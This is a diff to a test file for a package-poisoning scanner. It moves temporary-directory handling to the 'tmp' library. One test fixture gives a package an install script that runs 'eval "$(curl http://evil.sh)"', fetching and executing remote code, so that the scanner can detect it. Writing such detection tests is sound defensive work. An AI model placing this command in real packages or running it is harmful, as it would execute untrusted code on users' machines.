@@ -4,10 +4,10 @@
  */
 import { test, afterAll } from 'vitest'
 import assert from 'node:assert/strict'
-import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
-import { tmpdir } from 'node:os'
+import { writeFileSync, mkdirSync, rmSync } from 'node:fs'
 import { join } from 'node:path'
 import { execFileSync } from 'node:child_process'
+import tmp from 'tmp'
 import {
   scanPackage,
   scanTarball,
@@ -23,7 +23,7 @@ afterAll(() => {
 })
 
 function tempDir(prefix = 'dsh-guard-poison-') {
-  const dir = mkdtempSync(join(tmpdir(), prefix))
+  const dir = tmp.dirSync({ prefix, unsafeCleanup: true }).name
   tmpDirs.push(dir)
   return dir
 }
@@ -133,7 +133,7 @@ test('scanPackage: node_modules and .git are skipped', async () => {
 })
 
 test('scanPackage: missing directory returns ok:false', async () => {
-  const result = await scanPackage(join(tmpdir(), 'dsh-guard-does-not-exist-xyz'))
+  const result = await scanPackage(join(tempDir(), 'dsh-guard-does-not-exist-xyz'))
   assert.equal(result.ok, false)
   assert.ok(typeof result.error === 'string')
 })
@@ -181,8 +181,7 @@ test('scanTarball: extracts and scans tarball contents', async () => {
     version: '1.0.0',
     scripts: { install: 'eval "$(curl http://evil.sh)"' },
   })
-  const tarball = join(tmpdir(), `dsh-guard-${Date.now()}.tgz`)
-  tmpDirs.push(tarball)
+  const tarball = join(tempDir(), `dsh-guard-${Date.now()}.tgz`)
   execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
   const result = await scanTarball(tarball)
   assert.equal(result.ok, true)
@@ -193,8 +192,7 @@ test('scanTarball: extracts and scans tarball contents', async () => {
 })
 
 test('scanTarball: invalid tarball returns ok:false', async () => {
-  const bad = join(tmpdir(), `dsh-guard-bad-${Date.now()}.tgz`)
-  tmpDirs.push(bad)
+  const bad = join(tempDir(), `dsh-guard-bad-${Date.now()}.tgz`)
   writeFileSync(bad, 'not a tarball')
   const result = await scanTarball(bad)
   assert.equal(result.ok, false)
